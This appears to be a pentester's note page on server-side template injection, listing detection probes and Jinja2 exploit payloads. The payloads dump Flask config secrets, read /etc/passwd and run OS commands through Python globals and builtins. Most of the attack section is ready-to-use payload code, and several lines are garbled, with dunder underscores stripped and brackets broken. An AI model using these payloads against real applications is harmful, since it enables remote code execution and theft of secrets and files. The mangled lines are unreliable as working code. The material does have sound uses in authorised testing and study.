# SSTI

[https://github.com/payloadbox/ssti-payloads](https://github.com/payloadbox/ssti-payloads)

Step 1: Find an injection point, attempt basic payloads and see if app is vulnerable to SSTI.

Can be via input box, or in the URL

Basic Identification:

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Exploit

### Jinja2

* Dump all the config variables, will show the secret key, if the variable is set

```
{{ config }} 
```

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

### Jinja Injection without \<class 'object'>&#x20;

* From the there is another way to get to RCE without using that class.&#x20;
* \*\*\*\*If you manage to get to any function from those globals objects, you will be able to access **globals**.**builtins** and from there the RCE is very simple.&#x20;
* You can find functions from the objects request, config and any other interesting global object you have access to with:&#x20;

```
{{ request.__class__.__dict__ }}
application
_load_form_data
on_json_loading_failed ​ {{ config.class.dict }}
init
from_envvar
from_pyfile
from_object
from_file
from_json
from_mapping
get_namespace
repr ​
# You can iterate through children objects to find more
```

* Once you have found some functions you can recover the builtins with:

```
# Read File
{{ request.class._load_form_data.globals.builtins.open("/etc/passwd").read() }} ​
# RCE
{{ config.class.from_envvar.globals.builtins.import("os").popen("ls").read() }} {{ config.class.from_envvar["globals"]["builtins"]"import".popen("ls").read() }} {{ (config|attr("class")).from_envvar["globals"]["builtins"]"import".popen("ls").read() }} ​
{{ a }}​ ## Extra ## The global from config have a access to a function called import_string ## with this function you don't need to access the builtins {{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }} ​ 
# All the bypasses seen in the previous sections are also valid
```

If it is, the next step is determining the engine that is running the application&#x20;

[https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
